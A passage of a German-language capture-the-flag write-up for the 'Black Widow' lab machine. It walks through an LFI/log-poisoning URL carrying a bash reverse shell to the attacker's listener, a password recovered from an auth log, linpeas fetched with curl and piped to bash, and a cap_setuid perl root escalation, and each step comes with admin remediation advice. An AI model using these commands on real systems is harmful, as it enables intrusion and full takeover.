+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9001 gestartet. Eine URL wird gezeigt, die den LFI/Log-Poisoning-Exploit enthält, um eine Reverse Shell zu `192.168.2.140:9001` zu senden. Der Befehl `SHELL=/bin/bash script -q /dev/null` wird oft verwendet, um eine interaktivere TTY-Shell nach Erhalt einer einfachen Reverse Shell zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies beschreibt den finalen Schritt zur Erlangung einer Shell als `www-data`. Durch Aufrufen der präparierten URL wird der Code im Log ausgeführt, der `bash -i` startet und die Ein-/Ausgabe zum Listener auf dem Angreifer-System umleitet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den Listener aus, rufen Sie die URL auf und stabilisieren Sie die erhaltene Shell als `www-data`. Beginnen Sie mit der Enumeration als dieser Benutzer.
+             <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlungen zu LFI und Log Poisoning).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                     <pre><span class="comment">
+# URL für Reverse Shell (Aufruf im Browser oder mit curl):
+view-source:http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27
+
+# Befehl zur Shell-Stabilisierung (nach Erhalt der Verbindung):
+SHELL=/bin/bash script -q /dev/null
+</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> In der erhaltenen `www-data`-Shell wird eine Backup-Datei des Authentifizierungslogs (`/var/backups/auth.log`) durchsucht. Es wird speziell nach Einträgen gefiltert, die den Port `7090` enthalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt mehrere fehlgeschlagene Login-Versuche für einen "invalid user" namens `<span class="password">?V1p3r2020!?</span>` von der IP `192.168.1.109` auf Port `7090`. Der Benutzername enthält Sonderzeichen, aber der Kern `V1p3r2020!` sieht stark nach einem Passwort aus, das versehentlich als Benutzername eingegeben wurde. Es ist wahrscheinlich das Passwort für den Benutzer `viper`, der zuvor in `/etc/passwd` gefunden wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit dem Benutzernamen `viper` und dem vermuteten Passwort `V1p3r2020!` per SSH auf Port 22 anzumelden (`ssh viper@192.168.2.141`).
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, warum Authentifizierungslogs in `/var/backups` gespeichert werden und ob dies sicher geschieht. Beschränken Sie den Zugriff auf Log-Backups. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern und im korrekten Login-Vorgang. Implementieren Sie Intrusion Detection Systeme (wie fail2ban), um wiederholte fehlgeschlagene Login-Versuche zu blockieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@blackwidow:/var/www/html/company$ <span class="command">cat /var/backups/auth.log | grep 7090</span></div>
+                    <pre>
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090
+Dec 12 16:56:46 test sshd[29560]: Failed password for invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090 ssh2
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090
+Dec 12 16:56:43 test sshd[29560]: Invalid user <span class="password">?V1p3r2020!?</span> from 192.168.1.109 port 7090</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `viper` auf dem Zielsystem (192.168.2.141) anzumelden, vermutlich unter Verwendung des im vorherigen Schritt gefundenen Passworts `V1p3r2020!`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich (impliziert durch die fehlende Fehlermeldung und die nachfolgende Ausgabe von `cat local.txt`). Der Angreifer hat nun eine Shell als Benutzer `viper`. Anschließend wird die User-Flag aus `local.txt` gelesen: `<span class="password">d930fe79919376e6d08972dae222526b</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die User-Flag. Führen Sie Enumeration als Benutzer `viper` durch (z.B. `sudo -l`, SUID-Binaries, Cronjobs, Home-Verzeichnis untersuchen), um den nächsten Schritt zur Rechteausweitung auf Root zu finden.
+            <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, nicht erratbare Passwörter. Vermeiden Sie die Speicherung von Passwörtern in Logs. Überwachen Sie SSH-Logins.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">ssh viper@192.168.2.141</span></div>
+                    <pre>
+The authenticity of host '192.168.2.141 (192.168.2.141)' can't be established.
+ED25519 key fingerprint is SHA256:uAKXWMgmDlF/ZpvQDb+PUKtEN8lJntzsMNcHasplJ9U.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.141' (ED25519) to the list of known hosts.
+Password: <span class="comment">(Passwort 'V1p3r2020!' eingegeben)</span>
+Linux blackwidow 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
+[...] <span class="comment">(Login Banner)</span>
+<span class="prompt">viper@blackwidow:~$ </span><span class="command">cat local.txt</span>
+<span class="password">d930fe79919376e6d08972dae222526b</span>
+<span class="prompt">viper@blackwidow:~$ </span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein einfacher PHP-Webserver gestartet, um Dateien bereitzustellen. Auf dem Zielsystem wird dann `linpeas.sh`, ein bekanntes Linux-Enumerations- und Privilege-Escalation-Skript, vom Angreifer-Server heruntergeladen und direkt an `bash` übergeben, um es auszuführen. Die Ausgabe von LinPEAS wird nach der Zeichenkette `cap_setuid+ep` gefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> LinPEAS identifiziert eine kritische Fehlkonfiguration: Die Datei `/home/viper/backup_site/assets/vendor/weapon/arsenic` hat die `cap_setuid+ep` Capability gesetzt und ist für den aktuellen Benutzer (`viper`) schreibbar. Die `cap_setuid`-Capability erlaubt einem Prozess, seine effektive und reale Benutzer-ID zu ändern, was zur Rechteausweitung missbraucht werden kann, insbesondere wenn die Datei schreibbar ist oder eine bekannte Schwachstelle hat. Der Dateiname `arsenic` ist ebenfalls verdächtig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Überprüfen Sie den Dateityp von `arsenic` (`file /home/viper/.../arsenic`).</li><li>Wenn es sich um ein Skript (z.B. Perl, Python, Bash) handelt, überschreiben Sie es mit einem Payload, der `setuid(0)` aufruft und eine Root-Shell startet.</li><li>Wenn es sich um ein Binary handelt, recherchieren Sie, ob `arsenic` ein bekanntes Tool ist oder ob es speziell für diese CTF erstellt wurde.</li><li>Führen Sie das (ggf. modifizierte) `arsenic`-Binary aus, um Root-Rechte zu erlangen. Der im Text gezeigte Perl-Payload ist ein gängiger Weg, `cap_setuid` auszunutzen.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Entfernen Sie die `cap_setuid`-Capability von der `arsenic`-Datei (`sudo setcap cap_setuid-ep /home/viper/.../arsenic`) oder löschen Sie die Datei/das Verzeichnis, falls nicht benötigt.</li><li>Überprüfen Sie regelmäßig das System auf Dateien mit gesetzten Capabilities (`getcap -r / 2>/dev/null`), insbesondere `cap_setuid`.</li><li>Vergeben Sie Capabilities nur an vertrauenswürdige Binaries und stellen Sie sicher, dass diese nicht von unprivilegierten Benutzern überschrieben werden können.</li></ol></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">php -S 0.0.0.0:80</span></div>
+                     <pre>
+[Fri Sep  9 17:05:30 2022] PHP 8.1.5 Development Server (http://0.0.0.0:80) started
+<span class="password">[Fri Sep  9 17:06:07 2022] 192.168.2.141:49506 Accepted</span>
+<span class="password">[Fri Sep  9 17:06:07 2022] 192.168.2.141:49506 [200]: GET /linpeas.sh</span>
+<span class="password">[Fri Sep  9 17:06:07 2022] 192.168.2.141:49506 Closing</span></pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">viper@blackwidow:$ <span class="command">curl http://192.168.2.114:80/linpeas.sh | bash |grep "cap_setuid+ep"</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  806k  100  806k    0     0   109k      0  0:00:07  0:00:07 --:--:--  109k
+<span class="password">/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep is writable</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root Exploit)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Binary `/home/viper/backup_site/assets/vendor/weapon/arsenic`, das die `cap_setuid+ep`-Capability besitzt, wird ausgeführt. Es wird ein Perl-Payload (`-e '...'`) übergeben. Dieser Payload verwendet das POSIX-Modul, um `setuid(0)` aufzurufen (wodurch die effektive Benutzer-ID auf 0, also Root, gesetzt wird) und führt dann `/bin/bash` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Der Exploit funktioniert!</span> Da `arsenic` die `cap_setuid`-Capability hat, darf der Perl-Code `setuid(0)` erfolgreich aufrufen. Die nachfolgende `exec "/bin/bash"` startet eine neue Bash-Shell, die nun mit Root-Rechten läuft. Dies wird durch den Prompt `root@blackwidow:` bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Sie haben Root-Zugriff erlangt.</li><li>Lesen Sie die Root-Flag (`cat /root/root.txt`).</li><li>Führen Sie abschließende Aufräumarbeiten durch (Logs bereinigen, hochgeladene Dateien löschen etc.).</li></ol>
+            <strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlungen zu Capabilities) Entfernen Sie die `cap_setuid`-Capability von `arsenic` oder löschen Sie die Datei. Untersuchen Sie, wie diese Datei auf das System gelangt ist und die Capability erhalten hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment"># Vorheriger Befehl aus linpeas zur Demonstration der Capability (optional)</span>
+# sudo setcap cap_setuid+ep ./perl</pre>
+                     <div class="prompt">viper@blackwidow:$ <span class="command">/home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'</span></div>
+                     <pre><span class="comment">[Keine Ausgabe, aber der Prompt wechselt]</span></pre>
+                     <div class="prompt">root@blackwidow:~# <span class="command">id</span></div>
+                     <pre><span class="password">uid=0(root) gid=1001(viper) groups=1001(viper)</span></pre>
+                     <div class="prompt">root@blackwidow:~# </div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird versucht, die Root-Flag-Datei zu lesen. Es folgt eine ASCII-Art-Darstellung und die eigentliche Flag.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gelesen: `<span class="password">0780eb289a44ba17ea499ffa6322b335</span>`. Die ASCII-Art dient als Bestätigung und Hinweis der Maschinen-Ersteller.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Root-Flag. Der Test ist abgeschlossen.
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie das System gemäß den vorherigen Empfehlungen, um zukünftige Kompromittierungen zu verhindern.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@blackwidow:~# <span class="command">cat /root/root.txt</span></div>
+                    <pre>
+
+
+<span class="password">▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
+▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
+▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
+██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
+·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪</span>
+
+
+Congrats!
+
+You've rooted Black Widow!
+
+0xJin - mindsflee
+Follow on Instagram: 0xjiin
+Follow on Twitter: 0xJin , @mindsflee
+
+
+<span class="password">0780eb289a44ba17ea499ffa6322b335</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/viper/local.txt</div>
+                     <div class="flag-value"><span class="password">d930fe79919376e6d08972dae222526b</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">0780eb289a44ba17ea499ffa6322b335</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: [Datum nicht im Text spezifiziert]</p>
+    </footer>
+</body>
+</html>
